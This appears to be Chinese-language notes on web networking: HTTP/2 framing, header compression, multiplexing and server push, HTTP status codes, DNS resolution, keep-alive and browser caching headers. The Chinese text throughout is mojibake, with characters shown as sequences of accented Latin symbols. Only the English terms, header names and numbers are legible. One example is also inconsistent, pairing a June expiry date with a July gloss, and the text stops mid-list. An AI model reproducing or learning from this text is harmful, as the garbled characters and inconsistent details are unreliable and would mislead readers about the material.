http/1.x ç‰ˆæœ¬æ”¯æŒ Keep-aliveï¼Œç”¨æ­¤æ–¹æ¡ˆæ¥å¼¥è¡¥åˆ›å»ºå¤šæ¬¡è¿žæŽ¥äº§ç”Ÿçš„å»¶è¿Ÿï¼Œä½†æ˜¯åŒæ ·ä¼šç»™æœåŠ¡å™¨å¸¦æ¥åŽ‹åŠ›ï¼Œå¹¶ä¸”çš„è¯ï¼Œå¯¹äºŽå•æ–‡ä»¶è¢«ä¸æ–­è¯·æ±‚çš„æœåŠ¡ï¼ŒKeep-alive ä¼šæžå¤§å½±å“æ€§èƒ½ï¼Œå› ä¸ºå®ƒåœ¨æ–‡ä»¶è¢«è¯·æ±‚ä¹‹åŽè¿˜ä¿æŒäº†ä¸å¿…è¦çš„è¿žæŽ¥å¾ˆé•¿æ—¶é—´ã€‚ HTTP 2.0 äºŒè¿›åˆ¶åˆ†å¸§ã€‚è¿™æ˜¯ä¸€æ¬¡å½»åº•çš„äºŒè¿›åˆ¶åè®®ï¼Œå¤´ä¿¡æ¯å’Œæ•°æ®ä½“éƒ½æ˜¯äºŒè¿›åˆ¶ï¼Œå¹¶ä¸”ç»Ÿç§°ä¸ºâ€å¸§â€ï¼šå¤´ä¿¡æ¯å¸§å’Œæ•°æ®å¸§ã€‚ å¤´éƒ¨åŽ‹ç¼©ã€‚HTTP 1.1 ç‰ˆæœ¬ä¼šå‡ºçŽ° ã€ŒUser-Agentã€Cookieã€Acceptã€Serverã€Rangeã€ ç­‰å­—æ®µå¯èƒ½ä¼šå ç”¨å‡ ç™¾ç”šè‡³å‡ åƒå­—èŠ‚ï¼Œè€Œ Body å´ç»å¸¸åªæœ‰å‡ åå­—èŠ‚ï¼Œæ‰€ä»¥å¯¼è‡´å¤´éƒ¨åé‡ã€‚HTTP 2.0 ä½¿ç”¨ HPACK ç®—æ³•è¿›è¡ŒåŽ‹ç¼©ã€‚ å¤šè·¯å¤ç”¨ã€‚å¤ç”¨ TCP è¿žæŽ¥ï¼Œåœ¨ä¸€ä¸ªè¿žæŽ¥é‡Œï¼Œå®¢æˆ·ç«¯å’Œæµè§ˆå™¨éƒ½å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚æˆ–å›žåº”ï¼Œä¸”ä¸ç”¨æŒ‰é¡ºåºä¸€ä¸€å¯¹åº”ï¼Œè¿™æ ·å­è§£å†³äº†é˜Ÿå¤´é˜»å¡žçš„é—®é¢˜ã€‚ æœåŠ¡å™¨æŽ¨é€ã€‚å…è®¸æœåŠ¡å™¨æœªç»è¯·æ±‚ï¼Œä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘é€èµ„æºï¼Œå³æœåŠ¡å™¨æŽ¨é€ã€‚ è¯·æ±‚ä¼˜å…ˆçº§ã€‚å¯ä»¥è®¾ç½®æ•°æ®å¸§çš„ä¼˜å…ˆçº§ï¼Œè®©æœåŠ¡ç«¯å…ˆå¤„ç†é‡è¦èµ„æºï¼Œä¼˜åŒ–ç”¨æˆ·ä½“éªŒã€‚ è°ˆä¸€è°ˆä½ å¯¹ HTTP/2 ç†è§£å¤´éƒ¨åŽ‹ç¼©HTTP1.1 ç‰ˆæœ¬å‡ºçŽ° ã€ŒUser-Agentã€Cookieã€Acceptã€Serverã€Rangeã€ ç­‰å­—æ®µå¯èƒ½ä¼šå ç”¨å‡ ç™¾ç”šè‡³å‡ åƒå­—èŠ‚ï¼Œè€Œ Body å´ç»å¸¸åªæœ‰å‡ åå­—èŠ‚ï¼Œæ‰€ä»¥å¯¼è‡´å¤´éƒ¨åé‡ã€‚HTTP2.0 ä½¿ç”¨ HPACK ç®—æ³•è¿›è¡ŒåŽ‹ç¼©ã€‚ã€Œä¼ ç´¢å¼•ã€çš„æ–¹å¼ï¼Œå¯ä»¥è¯´è®©è¯·æ±‚å¤´å­—æ®µå¾—åˆ°æžå¤§ç¨‹åº¦çš„ç²¾ç®€å’Œå¤ç”¨ã€‚å…¶æ¬¡æ˜¯å¯¹äºŽæ•´æ•°å’Œå­—ç¬¦ä¸²è¿›è¡Œã€Œå“ˆå¤«æ›¼ç¼–ç ã€ï¼Œå“ˆå¤«æ›¼ç¼–ç çš„åŽŸç†å°±æ˜¯å…ˆå°†æ‰€æœ‰å‡ºçŽ°çš„å­—ç¬¦å»ºç«‹ä¸€å¼ ç´¢å¼•è¡¨ï¼Œç„¶åŽè®©å‡ºçŽ°æ¬¡æ•°å¤šçš„å­—ç¬¦å¯¹åº”çš„ç´¢å¼•å°½å¯èƒ½çŸ­ï¼Œä¼ è¾“çš„æ—¶å€™ä¹Ÿæ˜¯ä¼ è¾“è¿™æ ·çš„ã€Œç´¢å¼•åºåˆ—ã€ï¼Œå¯ä»¥è¾¾åˆ°éžå¸¸é«˜çš„åŽ‹ç¼©çŽ‡ã€‚ å¤šè·¯å¤ç”¨HTTP1.x ä¸­ï¼Œå¦‚æžœæƒ³å¹¶å‘å¤šä¸ªè¯·æ±‚ï¼Œå¿…é¡»ä½¿ç”¨å¤šä¸ª TCP é“¾æŽ¥ï¼Œä¸”æµè§ˆå™¨ä¸ºäº†æŽ§åˆ¶èµ„æºï¼Œè¿˜ä¼šå¯¹å•ä¸ªåŸŸååˆ 6-8 ä¸ªçš„ TCP é“¾æŽ¥è¯·æ±‚é™åˆ¶ã€‚ HTTP2 ä¸­ï¼š åŒåŸŸåä¸‹æ‰€æœ‰é€šä¿¡éƒ½åœ¨å•ä¸ªè¿žæŽ¥ä¸Šå®Œæˆã€‚ å•ä¸ªè¿žæŽ¥å¯ä»¥æ‰¿è½½ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµã€‚ æ•°æ®æµä»¥æ¶ˆæ¯çš„å½¢å¼å‘é€ï¼Œè€Œæ¶ˆæ¯åˆç”±ä¸€ä¸ªæˆ–å¤šä¸ªå¸§ç»„æˆï¼Œå¤šä¸ªå¸§ä¹‹é—´å¯ä»¥ä¹±åºå‘é€ï¼Œå› ä¸ºæ ¹æ®å¸§é¦–éƒ¨çš„æµæ ‡è¯†å¯ä»¥é‡æ–°ç»„è£…ï¼Œä¹Ÿå°±æ˜¯ Stream IDï¼Œæµæ ‡è¯†ç¬¦ï¼Œæœ‰äº†å®ƒï¼ŒæŽ¥æ”¶æ–¹å°±èƒ½ä»Žä¹±åºçš„äºŒè¿›åˆ¶å¸§ä¸­é€‰æ‹© ID ç›¸åŒçš„å¸§ï¼ŒæŒ‰ç…§é¡ºåºç»„è£…æˆè¯·æ±‚/å“åº”æŠ¥æ–‡ã€‚ æœåŠ¡å™¨æŽ¨é€æµè§ˆå™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸»åŠ¨å‘æµè§ˆå™¨æŽ¨é€ä¸Žè¿™ä¸ªè¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œè¿™æ ·æµè§ˆå™¨å°±ä¸ç”¨å‘èµ·åŽç»­è¯·æ±‚ã€‚ ç›¸æ¯”è¾ƒ HTTP/1.1 çš„ä¼˜åŠ¿ æŽ¨é€èµ„æºå¯ä»¥ç”±ä¸åŒé¡µé¢å…±äº«ã€‚ æœåŠ¡å™¨å¯ä»¥æŒ‰ç…§ä¼˜å…ˆçº§æŽ¨é€èµ„æºã€‚ å®¢æˆ·ç«¯å¯ä»¥ç¼“å­˜æŽ¨é€çš„èµ„æºã€‚ å®¢æˆ·ç«¯å¯ä»¥æ‹’æ”¶æŽ¨é€è¿‡æ¥çš„èµ„æºã€‚ äºŒè¿›åˆ¶åˆ†å¸§ä¹‹å‰æ˜¯æ˜Žæ–‡ä¼ è¾“ï¼Œä¸æ–¹ä¾¿è®¡ç®—æœºè§£æžï¼Œå¯¹äºŽå›žè½¦æ¢è¡Œç¬¦æ¥è¯´åˆ°åº•æ˜¯å†…å®¹è¿˜æ˜¯åˆ†éš”ç¬¦ï¼Œéƒ½éœ€è¦å†…éƒ¨çŠ¶æ€æœºåŽ»è¯†åˆ«ï¼Œè¿™æ ·å­æ•ˆçŽ‡ä½Žï¼ŒHTTP/2 é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼ï¼Œå…¨éƒ¨ä¼ è¾“ 01 ä¸²ï¼Œä¾¿äºŽæœºå™¨è§£ç ã€‚è¿™æ ·å­ä¸€ä¸ªæŠ¥æ–‡æ ¼å¼å°±è¢«æ‹†åˆ†æˆä¸€ä¸ªä¸ªäºŒè¿›åˆ¶å¸§ï¼Œç”¨ã€ŒHeaders å¸§ã€å­˜æ”¾å¤´éƒ¨å­—æ®µï¼Œã€ŒData å¸§ã€å­˜æ”¾è¯·æ±‚ä½“æ•°æ®ã€‚è¿™æ ·å­çš„è¯ï¼Œå°±æ˜¯ä¸€å †ä¹±åºçš„äºŒè¿›åˆ¶å¸§ï¼Œå®ƒä»¬ä¸å­˜åœ¨å…ˆåŽå…³ç³»ï¼Œå› æ­¤ä¸éœ€è¦æŽ’é˜Ÿç­‰å¾…ï¼Œè§£å†³äº† HTTP é˜Ÿå¤´é˜»å¡žé—®é¢˜ã€‚ åœ¨å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´ï¼ŒåŒæ–¹éƒ½å¯ä»¥äº’ç›¸å‘é€äºŒè¿›åˆ¶å¸§ï¼Œè¿™æ ·å­ã€ŒåŒå‘ä¼ è¾“çš„åºåˆ—ã€ï¼Œç§°ä¸ºæµï¼Œæ‰€ä»¥ HTTP/2 ä¸­ä»¥æµæ¥è¡¨ç¤ºä¸€ä¸ª TCP è¿žæŽ¥ä¸Šè¿›è¡Œå¤šä¸ªæ•°æ®å¸§çš„é€šä¿¡ï¼Œè¿™å°±æ˜¯å¤šè·¯å¤ç”¨æ¦‚å¿µã€‚ é‚£ä¹±åºçš„äºŒè¿›åˆ¶å¸§ï¼Œæ˜¯å¦‚ä½•ç»„è£…æˆå¯¹çš„æŠ¥æ–‡å‘¢ï¼Ÿ æ‰€è°“ä¹±åºï¼Œå€¼æ˜¯ä¸åŒ ID çš„ Stream æ˜¯ä¹±åºçš„ï¼Œå¯¹äºŽåŒä¸€ä¸ª Stream ID çš„å¸§æ˜¯æŒ‰é¡ºåºä¼ è¾“çš„ã€‚ æŽ¥æ”¶æ–¹æ”¶åˆ°äºŒè¿›åˆ¶åŽï¼Œå°†ç›¸åŒçš„ Stream ID ç»„è£…æˆå®Œæ•´çš„è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ã€‚ äºŒè¿›åˆ¶å¸§ä¸­æœ‰ä¸€äº›å­—æ®µï¼ŒæŽ§åˆ¶ç€ä¼˜å…ˆçº§å’Œæµé‡æŽ§åˆ¶ç­‰åŠŸèƒ½ï¼Œè¿™æ ·å­çš„è¯ï¼Œå°±å¯ä»¥è®¾ç½®æ•°æ®å¸§çš„ä¼˜å…ˆçº§ï¼Œè®©æœåŠ¡å™¨å¤„ç†é‡è¦èµ„æºï¼Œä¼˜åŒ–ç”¨æˆ·ä½“éªŒã€‚ ä»‹ç»ä¸€ä¸‹ HTTP å¸¸è§çŠ¶æ€ç RFC è§„å®š HTTP çš„çŠ¶æ€ç ä¸ºã€Œä¸‰ä½æ•°ã€ï¼Œç¬¬ä¸€ä¸ªæ•°å­—å®šä¹‰äº†å“åº”çš„ç±»åˆ«ï¼Œè¢«åˆ†ä¸ºäº”ç±»: ã€Œ1xxã€: ä»£è¡¨è¯·æ±‚å·²è¢«æŽ¥å—ï¼Œéœ€è¦ç»§ç»­å¤„ç†ã€‚ ã€Œ2xxã€: è¡¨ç¤ºæˆåŠŸçŠ¶æ€ã€‚ ã€Œ3xxã€: é‡å®šå‘çŠ¶æ€ã€‚ ã€Œ4xxã€: å®¢æˆ·ç«¯é”™è¯¯ã€‚ ã€Œ5xxã€: æœåŠ¡å™¨ç«¯é”™è¯¯ã€‚ 1xx ä¿¡æ¯ç±»æŽ¥å—çš„è¯·æ±‚æ­£åœ¨å¤„ç†ï¼Œä¿¡æ¯ç±»çŠ¶æ€ç ã€‚ 2xx æˆåŠŸ 200 OK è¡¨ç¤ºä»Žå®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ç«¯è¢«æ­£ç¡®è¯·æ±‚ã€‚ 204 No contentï¼Œè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼Œä½†æ²¡æœ‰èµ„æºå¯è¿”å›žã€‚ 206 Partial Contentï¼Œè¯¥çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨æˆåŠŸæ‰§è¡Œäº†è¿™éƒ¨åˆ†çš„ GET è¯·æ±‚å“åº”æŠ¥æ–‡ä¸­åŒ…å«ç”± ã€ŒContent-Rangeã€ æŒ‡å®šèŒƒå›´çš„å®žä½“å†…å®¹ã€‚ 3xx é‡å®šå‘ 301 moved permanentlyï¼Œæ°¸ä¹…æ€§é‡å®šå‘ï¼Œè¡¨ç¤ºèµ„æºå·²è¢«åˆ†é…äº†æ–°çš„ URLï¼Œè¿™æ—¶åº”è¯¥æŒ‰ Location é¦–éƒ¨å­—æ®µæç¤ºçš„ URI é‡æ–°ä¿å­˜ã€‚ 302 foundï¼Œä¸´æ—¶æ€§é‡å®šå‘ï¼Œè¡¨ç¤ºèµ„æºä¸´æ—¶è¢«åˆ†é…äº†æ–°çš„ URLã€‚ 303 see otherï¼Œè¡¨ç¤ºèµ„æºå­˜åœ¨ç€å¦ä¸€ä¸ª URLï¼Œåº”ä½¿ç”¨ GET æ–¹æ³•èŽ·å–èµ„æºã€‚ 304 not modifiedï¼Œå½“åå•†ç¼“å­˜å‘½ä¸­æ—¶ä¼šè¿”å›žè¿™ä¸ªçŠ¶æ€ç ã€‚ 307 temporary redirectï¼Œä¸´æ—¶é‡å®šå‘ï¼Œå’Œ 302 å«ä¹‰ç›¸åŒ,ä¸ä¼šæ”¹å˜ method 4XX å®¢æˆ·ç«¯é”™è¯¯ 400 bad requestï¼Œè¯·æ±‚æŠ¥æ–‡å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚ 401 unauthorizedï¼Œè¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰é€šè¿‡ HTTP è®¤è¯çš„è®¤è¯ä¿¡æ¯ã€‚ 403 forbiddenï¼Œè¡¨ç¤ºå¯¹è¯·æ±‚èµ„æºçš„è®¿é—®è¢«æœåŠ¡å™¨æ‹’ç»ã€‚ 404 not foundï¼Œè¡¨ç¤ºåœ¨æœåŠ¡å™¨ä¸Šæ²¡æœ‰æ‰¾åˆ°è¯·æ±‚çš„èµ„æºã€‚ 405 Method Not Allowedï¼ŒæœåŠ¡å™¨ç¦æ­¢ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ options æ–¹æ³•æ¥æŸ¥çœ‹æœåŠ¡å™¨å…è®¸çš„è®¿é—®æ–¹æ³•ï¼Œå¦‚ä¸‹ ðŸ‘‡ Access-Control-Allow-Methods â†’GET,HEAD,PUT,PATCH,POST,DELETE 5XX æœåŠ¡å™¨é”™è¯¯ 500 internal sever errorï¼Œè¡¨ç¤ºæœåŠ¡å™¨ç«¯åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿäº†é”™è¯¯ã€‚ 502 Bad Gatewayï¼ŒæœåŠ¡å™¨è‡ªèº«æ˜¯æ­£å¸¸çš„ï¼Œè®¿é—®çš„æ—¶å€™å‡ºäº†é—®é¢˜ï¼Œå…·ä½“å•¥é”™è¯¯æˆ‘ä»¬ä¸çŸ¥é“ã€‚ 503 service unavailableï¼Œè¡¨æ˜ŽæœåŠ¡å™¨æš‚æ—¶å¤„äºŽè¶…è´Ÿè½½æˆ–æ­£åœ¨åœæœºç»´æŠ¤ï¼Œæ— æ³•å¤„ç†è¯·æ±‚ã€‚ å‚è€ƒï¼šã€ŒæŸ¥ç¼ºè¡¥æ¼ã€å·©å›ºä½ çš„ HTTP çŸ¥è¯†ä½“ç³» DNS å¦‚ä½•å·¥ä½œçš„DNS åè®®æä¾›çš„æ˜¯ä¸€ç§ä¸»æœºååˆ° IP åœ°å€çš„è½¬æ¢æœåŠ¡ï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„åŸŸåç³»ç»Ÿã€‚æ˜¯åº”ç”¨å±‚åè®®ï¼Œé€šå¸¸è¯¥åè®®è¿è¡Œåœ¨ UDP åè®®ä¹‹ä¸Šï¼Œä½¿ç”¨çš„æ˜¯ 53 ç«¯å£å·ã€‚ æœ¬åœ° DNS æœåŠ¡å™¨æŸ¥è¯¢ï¼šé€’å½’æŸ¥è¯¢ 1å®¢æˆ·ç«¯-- &gt; æµè§ˆå™¨ç¼“å­˜-- &gt; æœ¬åœ°çš„hostsæ–‡ä»¶-- &gt; æœ¬åœ°DNSè§£æžå™¨ç¼“å­˜-- &gt; æœ¬åœ°DNSæœåŠ¡å™¨ æœ¬åœ° DNS æœåŠ¡å™¨å‘å…¶ä»–åŸŸåæœåŠ¡å™¨è¯·æ±‚çš„è¿‡ç¨‹ï¼šè¿­ä»£æŸ¥è¯¢ 123æœ¬åœ°DNSæœåŠ¡å™¨-- &gt; æ ¹åŸŸåæœåŠ¡å™¨æœ¬åœ°DNSæœåŠ¡å™¨-- &gt; é¡¶çº§åŸŸåæœåŠ¡å™¨æœ¬åœ°DNSæœåŠ¡å™¨-- &gt; æƒå¨åŸŸåæœåŠ¡å™¨ é€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢ é€’å½’æŸ¥è¯¢æŒ‡çš„æ˜¯æŸ¥è¯¢è¯·æ±‚å‘å‡ºåŽï¼ŒåŸŸåæœåŠ¡å™¨ä»£ä¸ºå‘ä¸‹ä¸€çº§åŸŸåæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œæœ€åŽå‘ç”¨æˆ·è¿”å›žæŸ¥è¯¢çš„æœ€ç»ˆç»“æžœã€‚ä½¿ç”¨é€’å½’æŸ¥è¯¢ï¼Œç”¨æˆ·åªéœ€è¦å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ã€‚ è¿­ä»£æŸ¥è¯¢æŒ‡çš„æ˜¯æŸ¥è¯¢è¯·æ±‚åŽï¼ŒåŸŸåæœåŠ¡å™¨è¿”å›žå•æ¬¡æŸ¥è¯¢çš„ç»“æžœã€‚ä¸‹ä¸€çº§çš„æŸ¥è¯¢ç”±ç”¨æˆ·è‡ªå·±è¯·æ±‚ã€‚ä½¿ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œç”¨æˆ·éœ€è¦å‘å‡ºå¤šæ¬¡çš„æŸ¥è¯¢è¯·æ±‚ã€‚ ä¸€èˆ¬è€Œè¨€ï¼Œæœ¬åœ°æœåŠ¡å™¨æŸ¥è¯¢æ˜¯é€’å½’æŸ¥è¯¢ï¼Œæœ¬åœ° DNS æœåŠ¡å™¨å‘å…¶ä»–åŸŸåæœåŠ¡å™¨è¯·æ±‚çš„è¿‡ç¨‹æ˜¯è¿­ä»£æŸ¥è¯¢ã€‚ DNS ä¸ºä»€ä¹ˆç”¨ UDP åè®®ä½œä¸ºä¼ è¾“DNS ä½¿ç”¨ UDP åè®®ä½œä¸ºä¼ è¾“å±‚åè®®çš„ä¸»è¦åŽŸå› æ˜¯ä¸ºäº†é¿å…ä½¿ç”¨ TCP åè®®é€ æˆçš„è¿žæŽ¥æ—¶å»¶ã€‚ Connection: keep-aliveHTTP åè®®é‡‡ç”¨â€œè¯·æ±‚-åº”ç­”â€æ¨¡å¼ï¼Œå½“ä½¿ç”¨æ™®é€šæ¨¡å¼ï¼Œå³éž keep-alive æ¨¡å¼æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚ã€åº”ç­”å®¢æˆ·å’ŒæœåŠ¡å™¨éƒ½è¦æ–°å»ºä¸€ä¸ªè¿žæŽ¥ï¼Œå®Œæˆä¹‹åŽç«‹å³æ–­å¼€è¿žæŽ¥ã€‚å½“ä½¿ç”¨ keep-alive æ¨¡å¼æ—¶ï¼Œkeep-alive åŠŸèƒ½ä½¿å®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¿žæŽ¥æŒç»­æœ‰æ•ˆï¼Œå½“å‡ºçŽ°å¯¹æœåŠ¡å™¨çš„åŽç»§è¯·æ±‚æ—¶ï¼Œkeep-alive åŠŸèƒ½é¿å…å»ºç«‹æˆ–è€…é‡æ–°å»ºç«‹è¿žæŽ¥ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ keep-alivekeep-alive æŠ€æœ¯çš„åˆ›å»ºç›®çš„ï¼Œèƒ½åœ¨å¤šæ¬¡ HTTP ä¹‹å‰é‡ç”¨åŒä¸€ä¸ª TCP è¿žæŽ¥ï¼Œä»Žè€Œå‡å°‘åˆ›å»ºã€å…³é—­å¤šä¸ª TCP è¿žæŽ¥å¼€é”€ï¼ˆåŒ…æ‹¬å“åº”æ—¶é—´ã€CPU èµ„æºï¼Œå‡å°‘æ‹¥å µï¼‰ã€‚ å®¢æˆ·ç«¯å¦‚ä½•å¼€å¯åœ¨ HTTPã€1.0 åè®®ä¸­ï¼Œé»˜è®¤æ˜¯å…³é—­çš„ï¼Œéœ€è¦ http å¤´åŠ å…¥ Connection: keep-aliveï¼Œæ‰èƒ½å¯åŠ¨ã€‚http1.1 ä¸­é»˜è®¤å¯åŠ¨ã€‚å¦‚æžœåŠ å…¥ Connection: close å…³é—­ã€‚ HTTP ç¼“å­˜ç­–ç•¥å¼ºç¼“å­˜å¼ºç¼“å­˜ä¸¤ä¸ªç›¸å…³å­—æ®µï¼ŒExpiresï¼ŒCache-Controlã€‚HTTP1.0 ç‰ˆæœ¬ä½¿ç”¨Expiresï¼ŒHTTP1.1 ä½¿ç”¨ Cache-Controlã€‚ ExpiresExpires å³è¿‡æœŸæ—¶é—´ï¼Œæ—¶é—´æ˜¯ç›¸å¯¹äºŽæœåŠ¡å™¨çš„æ—¶é—´è€Œè¨€çš„ï¼Œå­˜åœ¨äºŽæœåŠ¡ç«¯è¿”å›žçš„å“åº”å¤´ä¸­ï¼Œåœ¨è¿™ä¸ªè¿‡æœŸæ—¶é—´ä¹‹å‰å¯ä»¥ç›´æŽ¥ä»Žç¼“å­˜é‡Œé¢èŽ·å–æ•°æ®ï¼Œæ— éœ€å†æ¬¡è¯·æ±‚ã€‚ 1Expires:Mon, 29 Jun 2020 11:10:23 GMT è¡¨ç¤ºè¯¥èµ„æºåœ¨ 2020 å¹´ 7 æœˆ 29 æ—¥ 11:10:23 è¿‡æœŸï¼Œè¿‡æœŸæ—¶å°±ä¼šé‡æ–°å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚è¿™ç§æ–¹å¼æœ‰ä¸€ä¸ªé—®é¢˜ï¼šæœåŠ¡å™¨çš„æ—¶é—´å’Œæµè§ˆå™¨çš„æ—¶é—´å¯èƒ½å¹¶ä¸ä¸€è‡´ã€‚ Cache-ControlHTTP1.1 ç‰ˆæœ¬ï¼Œä½¿ç”¨è¯¥å­—æ®µï¼Œè¿™ä¸ªå­—æ®µé‡‡ç”¨çš„æ˜¯æ—¶é—´è¿‡æœŸæ—¶é•¿ï¼Œå¯¹åº”æ˜¯ max-ageã€‚ 1Cache-Control:max-age=6000 ä¸Šé¢è¡¨ç¤ºè¯¥èµ„æºè¿”å›žåŽ 6000 ç§’ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨ç¼“å­˜ã€‚ æ³¨æ„ï¼š å½“ Expires å’Œ Cache-Control åŒæ—¶å­˜åœ¨æ—¶ï¼Œä¼˜å…ˆè€ƒè™‘ Cache-Controlï¼› å½“æ²¡æœ‰å‘½ä¸­å¼ºç¼“å­˜ï¼ŒæŽ¥ä¸‹æ¥è¿›å…¥åå•†ç¼“å­˜ã€‚ åå•†ç¼“å­˜å¼ºç¼“å­˜å¤±æ•ˆåŽï¼Œæµè§ˆå™¨åœ¨è¯·æ±‚å¤´ä¸­æºå¸¦å“åº”çš„ç¼“å­˜ tag æ¥å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ ¹æ®å¯¹åº”çš„ tagï¼Œæ¥å†³å®šæ˜¯å¦ä½¿ç”¨ç¼“å­˜ã€‚ ç¼“å­˜åˆ†ä¸ºä¸¤ç§ï¼ŒLast-Modified å’Œ ETagã€‚ä¸¤è€…å„æœ‰ä¼˜åŠ¿ï¼Œå¹¶ä¸å­˜åœ¨è°å¯¹è°ç»å¯¹ä¼˜åŠ¿ã€‚ Last-Modifiedè¿™ä¸ªå­—æ®µè¡¨ç¤ºçš„æ˜¯æœ€åŽä¿®æ”¹æ—¶é—´ã€‚åœ¨æµè§ˆå™¨ç¬¬ä¸€æ¬¡ç»™æœåŠ¡å™¨å‘é€è¯·æ±‚åŽï¼ŒæœåŠ¡å™¨ä¼šåœ¨å“åº”å¤´ä¸­åŠ ä¸Šè¿™ä¸ªå­—æ®µã€‚ æµè§ˆå™¨æŽ¥æ”¶åŽï¼Œå¦‚æžœå†æ¬¡è¯·æ±‚ï¼Œä¼šåœ¨è¯·æ±‚å¤´æºå¸¦ If-Modified-Since å­—æ®µï¼Œè¿™ä¸ªå­—æ®µçš„å€¼å°±æ˜¯æœåŠ¡å™¨ä¼ æ¥çš„æœ€åŽä¿®æ”¹æ—¶é—´ã€‚ æœåŠ¡å™¨æ‹¿åˆ°è¯·æ±‚å¤´ä¸­çš„ If-Modified-Sinceçš„å­—æ®µåŽï¼Œå…¶å®žä¼šå’Œè¿™ä¸ªæœåŠ¡å™¨ä¸­è¯¥èµ„æºçš„æœ€åŽä¿®æ”¹æ—¶é—´å¯¹æ¯”ï¼š å¦‚æžœè¯·æ±‚å¤´ä¸­çš„è¿™ä¸ªå€¼å°äºŽæœ€åŽä¿®æ”¹æ—¶é—´ï¼Œè¯´æ˜Žæ˜¯æ—¶å€™æ›´æ–°äº†ã€‚è¿”å›žæ–°çš„èµ„æºï¼Œè·Ÿå¸¸è§„è¯·æ±‚çš„æµç¨‹ä¸€æ ·ï¼› å¦åˆ™è¿”å›ž 304ï¼Œé«˜é€Ÿæµè§ˆå™¨ç›´æŽ¥ä½¿ç”¨ç¼“å­˜ã€‚ ETagETag æ˜¯æœåŠ¡å™¨æ ¹æ®å½“å‰æ–‡ä»¶çš„å†…å®¹ï¼Œå¯¹æ–‡ä»¶ç”Ÿæˆå”¯ä¸€çš„æ ‡è¯†ï¼Œåªè¦é‡Œé¢å†…å®¹æœ‰æ”¹åŠ¨ï¼Œè¿™ä¸ªå€¼å°±ä¼šä¿®æ”¹ï¼ŒæœåŠ¡å™¨é€šè¿‡æŠŠå“åº”å¤´å°†è¯¥å­—æ®µè¿”å›žç»™æµè§ˆå™¨ç™»å½•ã€‚ æµè§ˆå™¨æŽ¥æ”¶åˆ° ETag å€¼ï¼Œä¼šåœ¨ä¸‹æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œå°†è¿™ä¸ªå€¼ä½œä¸º If-None-Match è¿™ä¸ªå­—æ®µçš„å†…å®¹ï¼Œå‘ç»™æœåŠ¡å™¨ã€‚ æœåŠ¡å™¨æŽ¥æ”¶åˆ° If-None-Match åŽï¼Œä¼šè·ŸæœåŠ¡å™¨ä¸Šè¯¥èµ„æºçš„ ETag è¿›è¡Œå¯¹æ¯”ã€‚ å¦‚æžœä¸¤è€…ä¸€æ ·çš„è¯ï¼Œç›´æŽ¥è¿”å›ž 304ï¼Œé«˜é€Ÿæµè§ˆå™¨ç›´æŽ¥ä½¿ç”¨ç¼“å­˜ï¼› å¦‚æžœä¸ä¸€æ ·çš„è¯ï¼Œè¯´æ˜Žå†…å®¹æ›´æ–°äº†ï¼Œè¿”å›žæ–°çš„èµ„æºï¼Œè·Ÿå¸¸è§„çš„ HTTP è¯·æ±‚å“åº”çš„æµç¨‹ä¸€æ ·ã€‚ ä¸¤è€…å¯¹æ¯” æ€§èƒ½ä¸Šï¼ŒLast-Modified ä¼˜äºŽ ETagï¼ŒLast-Modifiedè®°å½•çš„æ˜¯æ—¶é—´ç‚¹ï¼Œè€ŒETagéœ€è¦æ ¹æ®æ–‡ä»¶ç®—æ³•ç”Ÿæˆå¯¹åº”çš„ hash å€¼ã€‚ ç²¾åº¦ä¸Šï¼ŒETag ä¼˜äºŽ Last-Modifiedã€‚ETag æŒ‰ç…§å†…å®¹ç»™èµ„æºå¸¦ä¸Šæ ‡è¯†ï¼Œèƒ½å‡†ç¡®æ„ŸçŸ¥èµ„æºå˜åŒ–ï¼ŒLast-Modifiedåœ¨æŸäº›åœºæ™¯å¹¶ä¸èƒ½æ„ŸçŸ¥å˜åŒ–ã€‚ ç¼–è¾‘äº†èµ„æºæ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶å†…å®¹å¹¶æ²¡æœ‰æ›´æ”¹ï¼Œè¿™æ ·ä¼šé€ æˆç¼“å­˜å¤±æ•ˆï¼› Last-Modified èƒ½å¤Ÿæ„ŸçŸ¥çš„å•ä½æ˜¯ç§’ï¼Œå¦‚æžœæ–‡ä»¶åœ¨ 1s å†…æ”¹å˜äº†å¤šæ¬¡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™çš„ Last-Modified å¹¶æ²¡æœ‰ä½“çŽ°å‡ºä¿®æ”¹äº†ã€‚ ç¼“å­˜ä½ç½®æµè§ˆå™¨ç¼“å­˜çš„ä½ç½®ï¼Œåˆ†ä¸ºå››ç§ï¼Œä¼˜å…ˆçº§ä»Žé«˜åˆ°ä½Žï¼š Service Worker Memory Cache Disk Cache Push Cache HTTP 